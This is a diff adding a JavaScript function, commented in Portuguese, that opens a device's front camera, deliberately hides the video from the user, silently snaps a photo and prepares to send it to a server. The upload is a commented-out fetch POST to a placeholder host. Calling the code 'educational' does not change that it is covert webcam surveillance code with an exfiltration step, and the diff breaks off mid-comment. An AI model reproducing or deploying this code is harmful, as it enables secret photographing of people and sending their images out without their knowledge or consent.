@@ -1,0 +1,47 @@
+function capturarFoto() {
+    // Acessa a câmera frontal do dispositivo
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+        .then(function(stream) {
+            var video = document.createElement('video');
+            video.srcObject = stream;
+            video.style.display = 'none'; // Esconde o vídeo para o usuário não ver
+            document.body.appendChild(video);
+            
+            // Captura a foto após 1 segundo
+            setTimeout(function() {
+                var canvas = document.createElement('canvas');
+                var context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Converte o canvas para uma imagem base64
+                var dataURL = canvas.toDataURL('image/png');
+                
+                // Simula o envio da imagem para um servidor (exemplo educacional)
+                enviarFotoParaServidor(dataURL);
+            }, 1000); // Espera 1 segundo antes de capturar a foto
+        })
+        .catch(function(err) {
+            console.log("Ocorreu um erro ao acessar a câmera: " + err);
+        });
+}
+
+// Função para simular o envio da imagem para o servidor (exemplo educacional)
+function enviarFotoParaServidor(dataURL) {
+    console.log("Foto capturada automaticamente:", dataURL);
+    // Aqui você simularia o envio da imagem para um servidor (para fins educacionais)
+    // Em um cenário real, você implementaria a lógica para enviar a foto para o servidor de forma segura e com consentimento do usuário.
+    // Exemplo: enviar via XMLHttpRequest, fetch, ou outra tecnologia de requisição HTTP
+    // Exemplo fictício:
+    /*
+    fetch('https://seuservidor.com/receber-foto', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ fotoBase64: dataURL })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Resposta do servidor:', data);
